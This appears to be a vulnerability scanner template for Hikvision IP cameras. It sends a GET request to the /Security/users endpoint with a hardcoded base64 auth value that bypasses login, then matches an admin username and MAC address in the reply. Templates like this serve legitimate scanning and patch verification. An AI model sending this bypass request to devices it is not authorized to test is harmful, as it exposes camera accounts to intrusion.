id: Hikvision-uauth
info:
  author: str1am
  name: "\u6D77\u5EB7\u5A01\u89C6\u6444\u50CF\u5934\u672A\u6388\u6743\u8BBF\u95EE"
  severity: high
  tags: Hikvision,uauth
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <userName>admin</userName>
    - <macAddress>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Security/users?auth=YWRtaW46MTEK'
